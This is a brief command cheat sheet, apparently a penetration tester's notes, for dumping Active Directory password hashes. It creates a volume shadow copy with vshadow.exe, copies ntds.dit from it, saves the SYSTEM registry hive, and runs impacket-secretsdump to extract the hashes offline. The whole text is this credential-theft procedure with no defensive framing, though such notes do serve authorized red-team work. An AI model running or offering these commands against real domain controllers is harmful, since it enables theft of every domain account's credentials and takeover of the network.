#activedirectory #password #persiatance 

#### Extract NTDS

```cmd
vshadow.exe -nw -p  C:
```

Take shadow copy device name from output of the previous command
```cmd
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\ntds.dit.bak
```

```cmd
reg.exe save hklm\system c:\system.bak
```

#### Getting the hashes

```bash
impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
```
